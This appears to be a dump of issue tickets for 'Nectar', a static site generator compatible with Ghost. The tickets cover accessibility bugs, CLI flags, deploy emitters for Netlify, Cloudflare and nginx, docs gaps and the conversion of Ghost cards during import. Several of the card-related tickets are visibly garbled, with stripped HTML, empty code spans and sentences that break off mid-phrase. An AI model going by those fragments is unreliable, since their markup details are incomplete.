title: a11y: <main> element has no id and there are sometimes multiple <main> elements per page
body: On example/dist/tag/news/index.html the markup contains both `<main class="gh-main gh-outer">` (line 93) and a nested `<main class="gh-main">` (line 109). HTML5 allows only one non-hidden <main> per document. The same nesting occurs on author/casper/index.html (lines 93 and 121). On the post page (hello-nectar) only one <main> exists but it has no id, breaking any skip-link target. Verify with `npx html-validate example/dist/tag/news/index.html`. Fix: in the theme adapter, collapse the inner gh-main into a generic <div> (or render conditional logic so only the outer one survives), and add id="main" to the surviving element.

title: a11y: Search and burger buttons emit empty aria-label
body: In every generated page (example/dist/index.html lines 76-80, 86-87; same on hello-nectar, about, tag, author), the search button (`<button class="gh-search gh-icon-button" aria-label="" data-ghost-search>`) and burger button (`<button class="gh-burger gh-icon-button" aria-label="">`) have an explicitly empty aria-label, while their only visible content is an SVG icon with no <title>. Screen readers will announce them as 'button' with no purpose. This is a WCAG 4.1.2 / 2.4.4 failure. Verify with `npx pa11y file:///.../example/dist/index.html` or open the file in axe DevTools. Fix: the template hand-off should pass non-empty translation strings into the icon buttons (e.g. {{t "Search"}} / {{t "Menu"}}) and Nectar's `t` helper should fall back to the English label when no translation exists rather than emitting an empty string.

title: access: `{{#unless access}}` evaluates to falsy in source theme's lock-icon path
body:
post-card.hbs:33 reads `{{#unless access}}{{^has visibility="public"}}{{> "icons/lock"}}{{/has}}{{/unless}}`. `access` is undefined → `unless access` is truthy → we enter the block → `{{^has visibility="public"}}` (i.e. `unless visibility==='public'`) → if the post is non-public, render lock icon.

Problem: every post for non-logged-in users *should* be locked (because access is always denied in static-build land). Today our example renders lock icons on member/paid posts (good). But there's no helper named `access` registered, so Handlebars actually silently treats it as `undefined` (no helper warning because it could be a context property). Cleaner: register an `access` helper that returns false in builds, and document that themes can rely on this contract.

title: access: no policy for member/paid posts at build time
body:
Posts with `visibility: members | paid` currently render their full HTML to the public route (we have no auth). For Ghost parity:
- Default: render the first N words (configurable, default ~300) and append `<div class="gh-paywall-stub">` with a 'Subscribe to read more' CTA wired to portal
- Optional `[content].visibility_policy = "render-full" | "truncate" | "skip"` controlling whether we leak the full content, truncate, or skip the route entirely
- For `truncate`, use the same truncation as Ghost's paywall (`<!-- members -->` HTML comment marker; otherwise word count)

title: api: Content API URL versioning — emit under /ghost/api/content/ path too (not just /content/)
body:
Ghost's canonical URL prefix is `/ghost/api/content/posts/`. `@tryghost/content-api` constructs URLs as `${host}/ghost/api/content/<resource>/?key=...&v=v5.0`.

Nectar gap: I proposed `dist/content/posts.json` for brevity, but the SDK won't hit that path.

Proposal: emit shadows under `dist/ghost/api/content/<resource>.json` to match the SDK's path. Optionally also under shorter `/content/` via a symlink or duplicate write. Verify by pointing `@tryghost/content-api` at a `nectar build` output.

title: api: no public TypeScript types exported
body: Plugin authors writing TypeScript need `NectarPlugin`, `BuildContext`, `RouteContext`, `Post`, `Page`, `Tag`, `Author`, `SiteData`, helper types. Re-export from a `nectar/types` entry in `exports` and dual-export `.d.ts` from `tsc --emitDeclarationOnly`. Without this, plugin DX is `any`-soup.

title: api: no public extension API
body: DESIGN mentions optional components but no actual API. Define hook points (beforeBuild, afterContentLoad, afterRender, afterEmit), helper registration, route augmentation, transform pipeline.

title: api: no public plugin / hook API
body: DESIGN.md mentions "optional components" but `src/build/pipeline.ts` is hard-wired (sitemap/RSS coded inline). Define a `Plugin = { name, beforeBuild?, afterContentLoad?, beforeRender?, afterRender?, afterEmit? }` interface and have `build()` collect plugins from `nectar.toml` + node_modules `nectar-plugin-*`. Document the API in `nectar/plugin` types.

title: api: trailing-slash handling — emit both /posts.json and /posts/ (directory index) variants
body:
Ghost URLs are `/content/posts/` (trailing slash). With static hosting, `/content/posts/` is a directory request, so the file must be `dist/content/posts/index.json`. But `@tryghost/content-api` may not append `index.json`.

Proposal: investigate exactly what URL the SDK requests. Likely it's `/posts/?key=...` (trailing slash). Emit `dist/ghost/api/content/posts/index.json` AND ensure a `_redirects` rule rewrites `/posts/` → `/posts/index.json` if the host doesn't auto-resolve directory indexes for JSON.

Acceptance: `await new ContentAPI({...}).posts.browse()` returns posts against a `nectar build` deployed to plain S3.

title: ci: no .github/workflows/*.yml exists at all
body: The repo has zero CI. Add a `ci.yml` workflow on push/PR that runs `bun install`, `bun run check`, `bun run typecheck`, `bun test`, and `bun run build:example`. Block merges on red. Right now any PR could land typecheck errors.

title: ci: no dedicated lint workflow / no Biome check in CI
body: `bun run check` exists but isn't enforced. Add a `lint.yml` that runs `bun run check`, fails on style violations, and posts annotations via reviewdog or Biome's GH formatter.

title: ci: no theme-fixture smoke matrix
body: Today we only build `example/` against the vendored `Source` theme. Add a matrix that downloads Casper, Headline, Edition, Wave, Liebling from TryGhost org and builds them against a fixed content fixture, asserting the build doesn't crash. This is the only way to keep "Ghost theme compatible" honest.

title: cli: ad-hoc arg parsing, no `--help` per subcommand
body: We hand-parse `args.indexOf('--config')` everywhere. No subcommand-level `--help`, no usage hints, no auto-suggestions on typo (`nectar buld`). Adopt Bun's `parseArgs` or `commander`/`citty` for structured arg parsing, subcommand-level help, and typo suggestions.

title: cli: adopt node:util parseArgs for robust flag parsing
body: src/cli/commands/*.ts currently use ad-hoc args.indexOf('--config'), args[idx+1]. This breaks for `--config=path`, short flags, repeated flags, and `--` end-of-options. Replace with `import { parseArgs } from 'node:util'` (Bun supports it). Define a typed schema per subcommand: { config: { type: 'string', short: 'c' }, port: { type: 'string', short: 'p' }, ... }. Handle unknown flags by failing with exit code 2 and a 'did you mean' suggestion. Reference: build.ts:5-6, serve.ts:7-8, check.ts:7-8.

title: cli: argument parsing — typed CommandSpec registry
body: Define `interface CommandSpec { name; description; positionals; flags; examples; exitCodes }` and a `defineCommand()` helper. Build src/cli/index.ts dispatcher, --help renderer, completions, and JSON schema export from this single source. Eliminates the current N-way drift between index.ts usage text and individual commands' parsing.

title: cli: build: no --base-path override
body: `build.base_path` is config-only. PR previews / GitHub Pages / multi-tenant deploys need to override per build. Add `--base-path <path>`; normalise to leading/trailing slash; warn if not starting with `/`.

title: cli: build: no --output / -o override
body: Currently `build.output_dir` is read from nectar.config and there is no way to override on the CLI. Add `--output <dir>` (-o). Useful for CI matrix builds (preview, production, multi-locale).

title: cli: build: no --strict (warnings become errors)
body: Many things currently warn (missing image, invalid frontmatter date, unknown helper) and continue. CI deployments want `--strict` to fail the build on any warning. Wire through the logger so `warn()` increments a counter; strict mode causes a non-zero exit at end.

title: cli: check: no --strict flag — warnings vs errors collapsed
body: check.ts:6-30 only catches throws; everything else is logger.info. Add `--strict` so any warning (e.g. missing theme partial, deprecated frontmatter key) flips the exit code to 1. Required for CI gates.

title: cli: check: no per-file file:line error context
body: When zod validation fails on nectar.config.ts the message will be a zod issue tree, not 'nectar.config.ts:42 site.url must be a string'. Wrap zod errors to attach the source file path and (best-effort) line via the TOML/YAML parser's position info. Massive DX win.

title: cli: do not bind to 0.0.0.0 by default on serve
body: Confirm Bun.serve's default — if it binds 0.0.0.0 we leak local dev to the LAN. Default should be 'localhost' (127.0.0.1) and opt-in to 0.0.0.0 via --host.

title: cli: ensure-exit-on-unhandled-rejection
body: src/cli/index.ts:62-63 has `const code = await main(...); process.exit(code);` — fine for the happy path, but any unhandled rejection inside an awaited dynamic import will exit non-zero with no diagnostic. Add `process.on('unhandledRejection', ...)` and `process.on('uncaughtException', ...)` early in index.ts.

title: cli: error messages lack 'what to do next' guidance
body: Examples: build.ts:16 prints raw stack; new.ts:13 prints minimal usage; serve.ts:14 says 'Run nectar build first' (good, more like this everywhere). Standardise: every fatal error includes (1) what went wrong, (2) where (file:line), (3) what to do next, (4) a docs link. Reference: rust compiler diagnostic style.

title: cli: import-ghost: no overwrite policy
body: If a Ghost slug clashes with an existing file in content/posts, current behaviour is implicit (assume overwrite or skip — verify in src/ghost/import.ts). Add `--on-conflict skip|overwrite|rename` (default skip) and report each conflict on stderr.

title: cli: missing --json (machine-readable) output mode
body: No subcommand emits JSON. Add `--json` that switches the logger to NDJSON on stdout: `{ "level":"info", "ts":..., "event":"build.done", "summary":{ ... } }`. Critical for editor integrations, CI, and the future `nectar doctor`.

title: cli: missing automated tests for the CLI surface
body: tests/ likely has unit tests but no end-to-end coverage that runs `bun src/cli/index.ts build` against the example/ fixture and asserts on exit code, stdout, stderr. Add a tests/cli/*.test.ts suite using Bun's spawn API to cover the public contract.

title: cli: missing global --quiet / --verbose
body: Today logging level is via env var NECTAR_LOG_LEVEL only (src/util/logger.ts). Add `--quiet` (suppress info/debug, keep warn/error), `--verbose` (-V) bumps to debug. Allow stacking: `-VV` for trace. Wire into the logger module.

title: cli: missing subcommand — `nectar dev` (watch + serve + reload)
body: The single highest-impact missing command. `nectar dev` should: (1) watch content/, theme/, config; (2) incremental rebuild on change; (3) serve dist on a port; (4) inject a tiny WebSocket script that triggers full reload; (5) pretty-print errors with file:line; (6) auto-rebuild config if it changes. Today users must run build manually after every edit.

title: cli: missing subcommand — `nectar doctor`
body: Health check: bun version meets engines.bun, $EDITOR set, config schema valid, theme present, content dirs exist, no orphaned drafts, RSS/sitemap config sane, network reachable for `version --check`. Output table with PASS/WARN/FAIL plus 'how to fix'. `--json` for CI.

title: cli: missing subcommand — `nectar init` (interactive scaffold)
body: Interactive prompt-driven project init: site title, URL, theme (pick from list), starter content yes/no, RSS yes/no, deployment target. Writes nectar.config.toml, .gitignore, README, sample content. `--yes` for defaults (non-interactive CI).

title: cli: missing subcommand — `nectar theme lint` (gscan-compatible)
body: Ghost ships gscan to check theme compliance. Reimplement the rule set against Nectar's theme model (src/theme/loader.ts). Categories: errors (missing required templates), warnings (missing recommended partials), recommendations (accessibility, OG, semantic). Output table by default, `--json` for CI. Exit 1 on errors.

title: cli: new: no --content-dir override
body: Posts always go to `content/posts`, pages to `content/pages` (new.ts:21). Should honour `config.content.posts_dir` / `pages_dir` instead of hardcoded paths. Currently `nectar new` and the build pipeline disagree if the user customised these dirs.

title: cli: new: slug collision overwrites existing file silently
body: new.ts:33 writes unconditionally. If `content/posts/foo.md` exists, it is overwritten. Detect existence, fail with exit 1 and message 'Refusing to overwrite <path>. Pass --force to overwrite or --slug <other>.' Provide `--force` and `--slug` flags.

title: cli: no SIGINT/SIGTERM handler — Ctrl-C leaves dist/ in half-state
body: src/build/pipeline.ts:26 calls `rm(outputDir, { recursive: true, force: true })` then writes files. If the user hits Ctrl-C between the rm and full write, dist/ is empty or partial. Install a SIGINT handler that aborts the active write loop with a CancellationToken and either restores from a temp dir or warns about partial state. Use AbortSignal in writeHtml/copyAssets.

title: cli: no `nectar dev` watch/serve command
body: `nectar serve` only serves an already-built `dist/` (and errors if `dist/` doesn't exist) — there is no watch, no rebuild, no LiveReload. For anyone migrating from Ghost (which gives them an admin UI with live preview), this is the #1 blocker. Implement `nectar dev` = watch content+theme+config, rebuild incrementally, serve, push a SSE/WebSocket reload signal.

title: cli: no `nectar init` for first-time project bootstrap
body: Migrators landing without `nectar.toml`, without a theme, without a `content/` skeleton get unhelpful errors. Add `nectar init [--theme=source]` that scaffolds `nectar.toml`, `content/{posts,pages,authors,tags,images}/`, fetches the default theme, writes a sample post, and prints a next-steps tip. This is the natural pair of `import-ghost`.

title: cli: no graceful error messages with file:line context
body: When `loadContent` fails on bad frontmatter, the user gets a raw exception. Wrap loaders so errors carry `{ file, line, col, hint }` and the CLI prints a Cargo-style pointer (`---- content/posts/foo.md:3:5 - unknown field 'visibilty', did you mean 'visibility'?`). The current `pipeline.ts` already does `throw err` after logging `Failed to render ${route.url}` — extend that pattern everywhere.

title: cli: package.json bin points at src/cli/index.ts — not portable
body: package.json:8-10 binds `nectar` to the .ts source. Works under Bun only. For npm install -g via Node, need a built JS entry with a normal shebang. Add a build step that bundles to `dist/cli.mjs` and update `bin`.

title: cli: per-subcommand --help with examples
body: `nectar build --help` currently re-prints the top-level usage. Each subcommand should print: synopsis, description, flags (with defaults), examples, exit codes, environment variables, related commands. Build a help renderer that takes a structured CommandSpec. Reference: index.ts:5-19 only has global help.

title: cli: serve: no live reload / no watch
body: Serve is a static file server only. The user has to re-run build manually. This is what a `nectar dev` should do — see separate issue. As a stopgap, add `nectar serve --watch` that also rebuilds and ws-pushes a reload signal.

title: cli: serve: port collision crashes Bun.serve
body: serve.ts:19 calls Bun.serve without try/catch. If the port is in use, an unhandled Error throws. Catch EADDRINUSE, increment port up to N, or fail with a friendly 'Port 4321 is in use; try --port 4322'. Exit code 2.

title: cli: stdout pollution by logger.info breaks pipelines
body: logger.info writes to stdout (util/logger.ts:9-10). When the user runs `nectar config get build.output_dir` the only stdout should be the value. Move all 'progress' style logs to stderr; reserve stdout for the command's actual data output. Apply once we add data-emitting commands (config get, content show).

title: cli: support --key=value syntax across all subcommands
body: Current parser only handles `--key value`. `--config=./nectar.config.ts` is broken because `args.indexOf('--config=./nectar.config.ts')` returns -1. After switching to parseArgs this will be free; until then it is a silent bug. Add a regression test exercising both shapes.

title: comments: {{comments}} renders empty `<div>` — no provider wiring
body: Per DESIGN.md the helper is a stub. Add concrete providers behind `[components.comments] provider = "giscus"|"disqus"|"utterances"|"webmention.io"|"off"` and have the helper emit each provider's snippet using `repo`, `category`, `shortname` etc. configured at the toml. Comments are a hard requirement for any Ghost migrator with an existing comment section.

title: community: no CONTRIBUTING.md
body: Add `CONTRIBUTING.md` covering: how to clone, install Bun, run tests, file an issue, sign-off requirements (DCO?), Conventional Commits expectation, what "theme-compat regression" means. Without it, even motivated first-time contributors bounce.

title: community: no SECURITY.md / responsible disclosure policy
body: We touch user-provided HTML (`codeinjection_*`, raw markdown HTML), and the SVG/HTML output is user-published. We need a `SECURITY.md` with a private reporting channel (security@... or GitHub Security Advisories). Without it, well-intentioned researchers will file public issues with PoCs.

title: cross-theme: Koenig card HTML classes (kg-bookmark-card, kg-gallery-card, kg-callout-card, kg-button-card, kg-product-card, kg-toggle-card, kg-file-card, kg-audio-card, kg-video-card, kg-header-card, kg-nft-card, kg-signup-card)
body:
Every Casper-family theme's CSS hooks into Koenig card classes for layout. src/content/markdown.ts converts markdown to HTML but probably emits plain
,
    , , etc. instead of Koenig's `.kg-card .kg-image-card` wrappers. Implement card serialization in the markdown pipeline OR document Nectar's expected card shape and provide a remark plugin to wrap content in kg-* classes.

title: cross-theme: `img_url` size hash should resize, not just prefix
body: Our img_url (assets.ts:24) takes `size="xl"` but currently *doesn't* generate a resized URL — it returns the original. Implement: lookup theme.pkg.image_sizes[size] and emit `/content/images/size/w{width}/<path>` (Ghost's convention) or generate resized images at build time.

title: cross-theme: comment_count helper across Casper/Headline/Edition/Bulletin/Wave/Solo/Alto/Edition/Dawn/Digest/Journal
body: 13+ themes invoke `{{comment_count ... }}` with various hash params (class, autowrap, empty, singular, plural). Single global fix: register comment_count helper that emits `{{plural}}` with placeholders, accepts all hash params.

title: deploy: cloudflare-pages: no `_headers` emitter
body:
Cloudflare Pages reads `_headers` at the build-output root with a globbing DSL (`/*`, `/assets/*`). Nectar emits nothing. Without it, fingerprinted assets get default short cache, and security headers are missing.

**Fix**: add `src/build/emitters/cloudflare-pages.ts` writing `_headers` derived from `headers.yaml` config. Include `Cache-Control: public, max-age=31536000, immutable` for hashed asset paths and `Cache-Control: public, max-age=0, must-revalidate` for HTML.

title: deploy: cloudflare-pages: no `_redirects` emitter
body:
Cloudflare Pages honors a `_redirects` file (same syntax as Netlify, minus some flags). Nectar's pipeline never writes it.

**Fix**: emit `_redirects` from the shared `redirects.yaml`; collapse rules sharing prefixes; respect status codes (301/302/307/308).

title: deploy: cross-cutting: 404.html is never written from `error-404` template
body:
`src/theme/loader.ts` registers `error-404` as a known template name, but `src/build/routes.ts` never plans a route for it. `dist/404.html` is therefore missing, which breaks GitHub Pages, Netlify, Cloudflare Pages, Surge and S3 routing-rule-based 404 fallbacks. Only `serve.ts` references `404.html`.

**Fix**: in `planRoutes`, if `theme.templates['error-404']` exists, push a synthetic route with `outputPath: '404.html'`.

title: deploy: cross-cutting: no `.github/workflows/` directory or sample CI
body:
Repo has no GitHub Actions config. Every deploy target needs a sample workflow (build Nectar on push to main, upload artifact, deploy to provider). Without scaffolds, adoption friction is high.

**Fix**: add `examples/ci/` with `github-pages.yml`, `cloudflare-pages.yml`, `netlify.yml`, `vercel.yml`, `s3-cloudfront.yml`, `fly.yml`, `render.yml`.

title: deploy: cross-cutting: no `headers.yaml` / security-headers config
body:
There is no way to declare per-route HTTP headers (CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy, X-Content-Type-Options, COOP/COEP) or cache-control rules (long max-age + immutable for fingerprinted assets, short/no-cache for HTML). Without this, every platform-specific emitter has nothing to translate.

**Fix**: introduce a config block (`security_headers`, `cache_rules`) with sane defaults, including `Cache-Control: public, max-age=31536000, immutable` for `/assets/*.[hash].*` and `Cache-Control: public, max-age=0, must-revalidate` for HTML.

title: deploy: cross-cutting: no `redirects.yaml` source-of-truth schema
body:
Nectar has no input file or config section for redirects. Ghost sites import a redirects YAML/JSON; we need an equivalent (e.g. `redirects.yaml` at project root or `redirects:` block in `nectar.toml`) with `from`, `to`, `status` (301/302/308), and optional `force`. This is the prerequisite for every target-specific emitter (Netlify `_redirects`, Cloudflare `_redirects`, Vercel `vercel.json`, Apache `.htaccess`, nginx `try_files`, S3 routing rules).

**Fix**: define schema in `src/config/schema.ts` (or new `src/build/redirects.ts`), parse `redirects.yaml`, and pass into `pipeline.ts` for downstream emitters.

title: deploy: github-pages: missing `.nojekyll` for files starting with underscore
body:
GitHub Pages runs Jekyll by default and ignores `_assets/`, `_next/`-style directories. Theme fingerprinted assets under `assets/built/` are fine, but the moment a user uses a partial-named directory or vendored CSS like `_normalize.css`, files vanish from the deploy.

**Fix**: always emit `dist/.nojekyll` (zero-byte file) during build.

title: deploy: github-pages: no CNAME emitter for custom domains
body:
GitHub Pages requires a `CNAME` file at the publishing-source root to bind a custom domain. Nectar has no config field for `site.custom_domain` and no `CNAME` writer.

**Fix**: when `deploy.github_pages.custom_domain` is set, write `dist/CNAME` with the host (no trailing newline issues).

title: deploy: github-pages: no GitHub Actions workflow sample
body:
There's no `.github/workflows/github-pages.yml` for Nectar. Migrants from Jekyll/Hugo expect a copy-paste action that runs `bun install && bun run build` and uploads `dist/` via `actions/upload-pages-artifact` + `actions/deploy-pages`.

**Fix**: ship under `examples/ci/github-pages.yml` and reference from docs.

title: deploy: netlify: no `_headers` emitter
body:
Netlify reads `_headers` from publish dir. Without it, fingerprinted assets get cache-misses and security headers are absent.

**Fix**: same emitter as Cloudflare Pages (`src/build/emitters/netlify.ts`), share a `_headers` writer between targets.

title: deploy: netlify: no `_redirects` emitter
body:
Netlify `_redirects` syntax supports status codes, splats, country/role conditions. Nectar emits none. Without it, slug changes break links permanently.

**Fix**: emit `_redirects` from redirects.yaml; map `force: true` to `!` suffix in status (e.g. `301!`).

title: deploy: nginx: no `nginx.conf` emitter from shared redirects/headers
body:
Self-hosted nginx is the most common destination after migrating from Ghost (which itself runs on Ghost-CLI nginx). Nectar has no `nginx.conf` generator covering: `try_files $uri $uri/index.html =404;`, `gzip_static on;`, `brotli_static on;`, `add_header` blocks, redirect map.

**Fix**: `src/build/emitters/nginx.ts` outputs `dist/.nectar/nginx.conf` (server block) from `redirects.yaml` + `headers.yaml`.

title: deploy: nginx: no try_files fallback for trailing-slash variant
body:
Without `try_files $uri $uri/ $uri/index.html =404;` requests like `/about` will 404 even though `/about/index.html` exists. Default nginx configs frequently miss this.

**Fix**: include in emitted conf and document.

title: deploy: s3-cloudfront: no index document rewrite for sub-paths
body:
S3 static hosting maps bucket root `/` to `index.html` but `<slug>/` does NOT auto-resolve to `<slug>/index.html` unless either (a) website hosting mode is enabled (insecure direct origin) or (b) CloudFront has a Function/Lambda@Edge that appends `index.html`. Nectar has no recipe.

**Fix**: ship a CloudFront Function (`viewer-request`) sample under `examples/s3-cloudfront/append-index.js`.

title: deploy: vercel: no `vercel.json` emitter for routes/headers/redirects
body:
Vercel's static-site config lives in `vercel.json` (`headers`, `redirects`, `rewrites`, `cleanUrls`, `trailingSlash`). Nectar emits nothing.

**Fix**: `src/build/emitters/vercel.ts` emits a single `vercel.json` derived from redirects.yaml + headers.yaml + `build.trailing_slash`.

title: docs: no SECURITY.md
body: Define disclosure address and process; private vulnerability reporting via GitHub Security Advisories.

title: docs: no docs site, only DESIGN.md + GHOST_COMPATIBILITY.md + README
body: To convert evaluators we need a real docs site (docs.nectar.dev or similar) hosting: install guides, config reference, theme dev guide, helper matrix, plugin API, migration playbook, FAQ. Bootstrap with Nectar itself (dogfood) or Starlight/VitePress under `docs-site/`.

title: docs: no migration guide (long form) for Ghost users
body: Step-by-step: export from Ghost, run import, copy images, edit nectar.toml, run build, deploy. Include screenshots.

title: docs: no migration playbook (specific to Ghost users)
body: A single dense page: `docs/migration/ghost.md`. Steps, gotchas, before/after screenshots, redirect strategy, members-paywall caveat. The first hit on Google for "migrate Ghost to static" should be this page.

title: docs: no theme dev guide
body: Document our Ghost compatibility surface, helper signatures, partial conventions, asset pipeline. With examples.

title: docs: no tutorials or quickstart beyond a 4-line README block
body: Need step-by-step pieces: (1) Start a blog from scratch, (2) Migrate from Ghost in 10 minutes, (3) Customise the Source theme, (4) Deploy to Cloudflare Pages / Vercel / Netlify / GitHub Pages, (5) Write your first plugin. Each should be an evaluable thing a junior dev can copy/paste.

title: ghost-card: ALL: image-pipeline — `__GHOST_URL__` placeholder leaks into final output
body: Ghost exports replace site URLs with the literal string `__GHOST_URL__` in the HTML body of posts, feature_image, social images, og_image, codeinjection. Our importer (`src/ghost/import.ts`) writes these to disk unchanged in frontmatter (`feature_image: "__GHOST_URL__/content/images/…"`) and in body (after Turndown converts the HTML). At render time, the placeholder is **never resolved** — it ends up in `` on the live site. **Fix**: in `importGhostExport`, after parsing JSON and before Turndown, walk all string fields and replace `__GHOST_URL__` with `''` (relative root). Document the contract.

title: ghost-card: ALL: image-pipeline — feature_image / og_image / twitter_image not relocated on import
body:
Even with `__GHOST_URL__` resolved, the relative paths still reference `/content/images/…` which only exists if we copy the asset folder from the Ghost export. `import.ts` does not. Result: feature images, meta-images, profile pics, tag images — all broken links.

**Fix**: accept either a JSON file or a Ghost export ZIP/folder. When folder, copy `content/images/`, `content/files/`, `content/media/` to the site's static asset root. Plumb a `--assets <dir>` CLI flag too.

title: ghost-card: ALL: image-pipeline — no responsive variant generation (sharp/squoosh)
body:
Ghost generates `600w`, `1000w`, `1600w`, `2400w` variants for every uploaded image and threads them into `srcset` on the rendered HTML. Migration drops this (Turndown discards `srcset`). Without an asset pipeline, even if we kept the source, all in-body images are full-size.

**Fix**: add `src/build/images.ts` using `sharp` to generate variants at build time for any image under `content/images/`. Make the figure-promotion pass emit srcset/sizes matching Ghost's contract.

title: ghost-card: ALL: migration — Lexical/Mobiledoc bodies are silently skipped
body:
`src/ghost/import.ts:renderPostBody` logs a warning and **returns an empty string** if `post.html` is empty but `lexical`/`mobiledoc` is present. The user message says "Use 'Export with HTML' from Ghost" — but the Ghost admin UI's default export *does not* include rendered HTML for all card types. Many exports have lexical-only.

More critically, even when `html` IS present, the lexical document contains card-level fidelity that the HTML throws away (e.g. markdown card source, embed metadata, alignment classes Ghost computed but didn't always serialise back into HTML).

**Fix**: implement a lexical/mobiledoc walker (port `@tryghost/kg-default-cards` server-side renderer or use it as a dep). For each card node, emit the matching shortcode directly from lexical instead of round-tripping through HTML+Turndown. This is the only path to lossless migration.

title: ghost-card: ALL: migration — Turndown has zero custom rules, default behaviour is lossy for figures
body:
`src/ghost/import.ts:8` constructs `new TurndownService({ headingStyle: 'atx', codeBlockStyle: 'fenced' })`. No `addRule`, no `keep`, no `remove`. Turndown's defaults treat unknown elements (figure, picture, iframe, audio, video, details, summary, mark, sub, sup) as transparent — children are walked, parent classes/attrs are dropped.

This means ~80% of Ghost card metadata is destroyed on import even when the source HTML carries it.

**Fix**: add a `src/ghost/turndown-rules.ts` registering one rule per card type. Use `turndown.addRule('kg-bookmark', { filter: node => …, replacement: … })`. Each rule produces the corresponding shortcode.

title: ghost-card: ALL: migration — `<!--kg-card-begin: X --> … <!--kg-card-end: X -->` fence comments dropped by Turndown
body:
Ghost wraps several card types in HTML comment fences (`markdown`, `html`, `email`, `email-cta`). Turndown drops comments by default. We lose the ability to detect which region of HTML came from which card type, which is fatal for `email`/`email-cta` (must strip) and useful for `markdown`/`html` (preserve raw). **Fix**: preprocess `post.html` to convert `` into a unique inline marker that Turndown will preserve (e.g. wrap target region in `
…
`). Then add Turndown rules keyed on the `data-kg-card` attribute.

title: ghost-card: ALL: rendering — no shortcode/directive pipeline in markdown renderer
body:
`src/content/markdown.ts` uses bare `marked` with GFM only. There's no mechanism to register shortcodes (`{% card %}…{% /card %}`), directives (`:::card{…}\n…\n:::`), or custom block extensions. Without one, every card-aware migration rule produces output that's just literal text in the final HTML.

**Fix**: pick one of:
1. `marked` extensions API — register a `name: 'shortcode'` extension matching `{% … %}`. Lightweight, no new dep.
2. Switch to `remark` + `remark-directive` + `remark-rehype` — heavier but more expressive (the `:::container` syntax is standardised).

Document the chosen pipeline in `docs/DESIGN.md`.

title: ghost-card: ALL: theme-dev — no smoke test fixture exercising every card type
body:
There is no `tests/fixtures/cards/` corpus with one post per card type. Adding any card-aware code without such a corpus risks silent regressions. The existing tests (`tests/render/`) cover layout-level concerns, not card markup.

**Fix**: create `tests/fixtures/ghost-cards-corpus.md` with every card type (one section per card), a paired `.expected.html` snapshot, and a `tests/render/cards.snapshot.test.ts` that diffs the rendered output. Update snapshots intentionally as cards land.

title: ghost-card: audio: image-pipeline — cover art uses `__GHOST_URL__` placeholder that we don't resolve
body:
Audio thumbnails (cover art) in Ghost exports use `__GHOST_URL__/content/images/…`. Our `src/ghost/import.ts` does not run a placeholder-replacement pass before Turndown, so the placeholder leaks into the markdown body and breaks at render time.

**Fix**: pre-process `post.html` in `renderPostBody` to swap `__GHOST_URL__` → empty string (or configured site URL) for `src=`, `srcset=`, `href=`, and inline-style URL values. Cover the same fix for video poster, file href, and feature_image.

title: ghost-card: audio: migration — Turndown drops `<audio>` tag, drops cover art, drops duration
body:
Ghost audio card: `
…svg…
Episode 5
……0:00/12:34…
` plus a sibling `

title: ghost-card: audio: rendering — Source theme has NO CSS for kg-audio-card
body:
`grep -oE 'kg-[a-z-]+' example/themes/source/assets/css/screen.css | sort -u` returns no `kg-audio-*` selectors at all. Ghost's audio card depends entirely on Koenig-injected CSS + a sibling JS that hydrates the player. A statically rendered audio card on Source would be an unstyled `<audio>` plus orphan divs.

**Fix**: vendor Ghost's audio player CSS + JS (`@tryghost/kg-default-cards` ships these as `kg-audio.js` / `kg-audio.css`) into the Source theme, or document a hard requirement. Without this, audio cards are broken even if migration succeeded.

title: ghost-card: bookmark: migration drops all metadata, link becomes plain anchor
body: Ghost's bookmark card serialises in HTML as ``. In `src/ghost/import.ts:renderPostBody` we run `turndown` over the post HTML with no custom rules. Turndown's default `

title: ghost-card: callout: migration — Turndown drops emoji icon and background-color variant
body:
Ghost callout HTML: `
💡
Body text
`. The `kg-callout-card-` suffix encodes one of `grey|white|blue|green|yellow|red|pink|purple|accent`. Turndown sees two divs and produces something like: ``` 💡 Body text ``` — two paragraphs. The color and the semantic callout marker are lost. **Fix**: Turndown rule matching `div.kg-callout-card` → emits `> [!CALLOUT color="blue" emoji="💡"]\n> Body text` (GFM-alert-ish) or `:::callout{color="blue" emoji="💡"}\nBody\n:::` (markdown-it container).

title: ghost-card: email: migration — email-only content silently shipped to web
body:
Ghost has two card types that are **email-only** — they should NOT appear in the web version of a post: `email` (raw HTML/text injected only into the newsletter) and `email-cta` (a CTA visible only to email subscribers). Ghost wraps them in `<!--kg-card-begin: email--> … <!--kg-card-end: email-->` comment fences.

Turndown drops the fence comments and keeps the inner content. Result: subscriber-only material leaks onto the public site.

**Fix**: in the import preprocessor, strip everything between `<!--kg-card-begin: email-->` and `<!--kg-card-end: email-->` (and same for `email-cta`). Add a regression test with a fixture post containing both.

title: ghost-card: embed: migration — oEmbed metadata (provider, html, url) collapsed to bare iframe or link
body:
Ghost embed card stores oEmbed-resolved data: `{ url, html, type: 'video'|'rich'|'photo'|'link', metadata: { author, title, … } }`. On render it emits `` for YouTube/Vimeo/Spotify, `
…
` for Twitter (with required external `widgets.js`), `
…
` for Instagram, etc. Turndown's default behaviour: - `

title: ghost-card: embed: rendering — `.kg-embed-card` is the only embed selector in Source CSS
body:
`screen.css:2298` styles `.kg-embed-card` (top-level layout). Nothing inside it. Twitter/Instagram embeds depend on their **own** external `widgets.js`/`embed.js` to hydrate the blockquote into a styled card. If we don't include those scripts (per provider), social embeds render as ugly raw blockquotes.

**Fix**: a per-provider embed renderer in `src/render/helpers/`:
- youtube → `<iframe loading="lazy" allowfullscreen src="https://www.youtube.com/embed/…">` with privacy-mode option.
- vimeo → similar iframe.
- spotify → iframe.
- twitter → blockquote + lazy-loaded `widgets.js` (add `loading="lazy"` script tag once per page).
- instagram → blockquote + `embed.js`.
- tiktok → blockquote + `embed.js`.
- codepen → iframe with `data-` attrs + `ei.js`.

Document the privacy/GDPR implications.

title: ghost-card: file: asset-pipeline — file references are bare URLs, no relocation/copy step on import
body:
Ghost stores files under `/content/files/YYYY/MM/<name>` (or via `__GHOST_URL__/content/files/…`). The Ghost export zip includes a `files/` directory, but `src/ghost/import.ts` only reads `db[0].data` and ignores the files folder. Result: imported file cards link to URLs that 404 in the static output.

**Fix**: when given a zip (or extracted folder) path, copy `files/**` to `static/content/files/` (or `content/files/`) and rewrite `__GHOST_URL__` prefixes. Mirror the same treatment for `/content/images/` and `/content/media/`.

title: ghost-card: gallery: migration — Turndown explodes 3×3 grid into 9 stacked images
